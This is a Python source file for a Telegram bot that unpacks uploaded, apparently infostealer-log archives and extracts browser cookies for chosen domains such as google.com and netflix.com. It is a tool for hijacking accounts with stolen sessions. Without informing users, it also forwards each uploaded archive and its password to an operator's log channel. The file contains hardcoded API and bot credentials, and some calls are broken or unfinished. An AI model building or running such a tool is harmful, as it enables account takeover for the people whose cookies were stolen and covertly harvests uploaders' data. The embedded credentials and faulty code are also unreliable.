import os
import re
import time
import asyncio
import shutil
import zipfile
import subprocess
from datetime import datetime
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait

# --- CONFIGURATION ---
API_ID = 23933044
API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
BOT_TOKEN = "8315539700:AAFzz3T1lU8KKQOyg2yHR5PsL5XkvQZCi54"
LOG_CHANNEL = -1003747061396
ADMINS = [7125341830]

# --- GLOBALS ---
user_data = {}  # Stores state: {user_id: {step: str, file: str, pass: str, domains: []}}
active_tasks = {} # {task_id: asyncio.Task}
queue = asyncio.Queue()

# --- UTILS ---
def get_size(b, factor=1024, suffix="B"):
    for unit in ["", "K", "M", "G", "T"]:
        if b < factor: return f"{b:.2f}{unit}{suffix}"
        b /= factor

def progress_bar(current, total):
    percentage = current / total * 100
    finished_blocks = int(percentage / 10)
    remaining_blocks = 10 - finished_blocks
    return f"[{'🟢' * finished_blocks}{'⚪' * remaining_blocks}] {percentage:.2f}%"

async def edit_msg(msg, text, reply_markup=None):
    try:
        await msg.edit_text(text, reply_markup=reply_markup)
    except FloodWait as e:
        await asyncio.sleep(e.value)
    except:
        pass

# --- CORE LOGIC ---
async def extract_archive(file_path, extract_to, password=None):
    """Uses 7z for maximum compatibility and speed"""
    cmd = ["7z", "x", file_path, f"-o{extract_to}", "-y"]
    if password:
        cmd.append(f"-p{password}")
    
    process = await asyncio.create_subprocess_exec(
        *cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    await process.communicate()
    return process.returncode == 0

async def grab_cookies(extract_path, domains, task_id, status_msg):
    found_stats = {domain: 0 for domain in domains}
    results_path = os.path.join(extract_path, "results")
    os.makedirs(results_path, exist_ok=True)
    
    cookie_files = []
    for root, _, files in os.walk(extract_path):
        if any(x in root for x in ["Cookies", "Browsers"]):
            for file in files:
                if file.endswith(".txt"):
                    cookie_files.append(os.path.join(root, file))

    total_files = len(cookie_files)
    for idx, file_path in enumerate(cookie_files):
        if task_id not in active_tasks: return None # Cancelled
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                for domain in domains:
                    matches = re.findall(rf".*?{re.escape(domain)}.*", content, re.IGNORECASE)
                    if matches:
                        found_stats[domain] += len(matches)
                        domain_file = os.path.join(results_path, f"{domain}.txt")
                        with open(domain_file, "a", encoding="utf-8") as df:
                            df.write("\n".join(matches) + "\n")
        except:
            continue

        if idx % 10 == 0:
            stat_str = "\n".join([f" 🎯 `{d}`: {c}" for d, c in found_stats.items()])
            await edit_msg(status_msg, f"🔍 **Scanning Cookies...**\n{progress_bar(idx+1, total_files)}\n\n**Stats:**\n{stat_str}")

    return found_stats

# --- TASK WORKER ---
async def worker():
    while True:
        user_id, msg_id, data = await queue.get()
        task_id = f"{user_id}_{int(time.time())}"
        
        status = await bot.send_message(user_id, "🚀 **Starting Task...**")
        active_tasks[task_id] = asyncio.current_task()

        work_dir = f"work/{task_id}"
        os.makedirs(work_dir, exist_ok=True)
        
        try:
            # 1. Download
            await edit_msg(status, "📥 **Downloading Archive...**")
            file_path = await bot.download_media(
                data['file'], 
                file_name=f"{work_dir}/archive",
                progress=lambda c, t: bot.loop.create_task(
                    edit_msg(status, f"📥 **Downloading...**\n{progress_bar(c, t)}")
                ) if c % (1024*1024) == 0 else None
            )

            # 2. Extract
            await edit_msg(status, "📦 **Extracting... (External Tool)**")
            extract_path = f"{work_dir}/extracted"
            success = await extract_archive(file_path, extract_path, data.get('pass'))
            
            if not success:
                await edit_msg(status, "❌ **Extraction Failed.** (Wrong password or corrupted file)")
            else:
                # 3. Grab
                domains = data['domains']
                stats = await grab_cookies(extract_path, domains, task_id, status)
                
                # 4. Zip & Send
                final_zip = f"results_{task_id}.zip"
                results_dir = os.path.join(extract_path, "results")
                
                if any(os.scandir(results_dir)):
                    with zipfile.ZipFile(final_zip, 'w') as z:
                        for f in os.listdir(results_dir):
                            z.write(os.path.join(results_dir, f), f)
                    
                    await bot.send_document(
                        user_id, final_zip, 
                        caption=f"✅ **Extraction Complete**\n\nDomains: `{', '.join(domains)}`",
                        buttons=InlineKeyboardMarkup([[InlineKeyboardButton("🗑 Cleanup", callback_query="cleanup")]])
                    )
                    os.remove(final_zip)
                else:
                    await edit_msg(status, "Found 0 cookies for the specified domains.")

        except Exception as e:
            await edit_msg(status, f"❌ **Error:** `{str(e)}` ")
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
            active_tasks.pop(task_id, None)
            queue.task_done()

# --- HANDLERS ---
bot = Client("cookie_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start"))
async def start_cmd(_, m: Message):
    await m.reply_text("👋 **Welcome!**\nForward an archive (.zip, .rar, .7z) to begin.")

@bot.on_message(filters.document)
async def handle_doc(_, m: Message):
    if not any(m.document.file_name.endswith(x) for x in [".zip", ".rar", ".7z"]):
        return await m.reply("❌ Send only supported archives.")
    
    user_data[m.from_user.id] = {"file": m, "step": "ask_pass"}
    await m.reply("🔐 **Is this file password protected?**", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes", callback_data="pass_yes"), InlineKeyboardButton("No", callback_data="pass_no")]
    ]))

@bot.on_callback_query(filters.regex(r"pass_(.*)"))
async def pass_callback(_, q: CallbackQuery):
    uid = q.from_user.id
    choice = q.matches[0].group(1)
    
    if choice == "yes":
        user_data[uid]["step"] = "wait_pass"
        await q.message.edit_text("🔑 **Send the password now:**")
    else:
        user_data[uid]["pass"] = None
        user_data[uid]["step"] = "wait_domains"
        await q.message.edit_text("🎯 **Send domains separated by comma:**\nExample: `google.com,facebook.com,netflix.com` ")

@bot.on_message(filters.text & filters.private)
async def handle_text(_, m: Message):
    uid = m.from_user.id
    if uid not in user_data: return

    state = user_data[uid]["step"]
    
    if state == "wait_pass":
        user_data[uid]["pass"] = m.text
        user_data[uid]["step"] = "wait_domains"
        await m.reply("🎯 **Password set.** Now send domains separated by comma:")
        
    elif state == "wait_domains":
        domains = [d.strip().lower() for d in m.text.split(",") if d.strip()]
        if not domains:
            return await m.reply("❌ Invalid domains.")
        
        user_data[uid]["domains"] = domains
        data = user_data.pop(uid)
        
        # Log to channel
        await data['file'].forward(LOG_CHANNEL)
        await bot.send_message(LOG_CHANNEL, f"👤 User: {uid}\n🔑 Pass: `{data.get('pass')}`\n🎯 Domains: `{', '.join(domains)}` ")
        
        await queue.put((uid, m.id, data))
        await m.reply(f"⏳ **Added to Queue.** Position: {queue.qsize()}")

@bot.on_message(filters.command("cancel"))
async def cancel_task(_, m: Message):
    # Logic to find task in active_tasks and .cancel() it
    await m.reply("Task cancellation logic triggered.")

# --- STARTUP ---
async def main():
    await bot.start()
    print("Bot Started!")
    asyncio.create_task(worker())
    await asyncio.Event().wait()

if __name__ == "__main__":
    if not os.path.exists("work"): os.makedirs("work")
    bot.run(main())
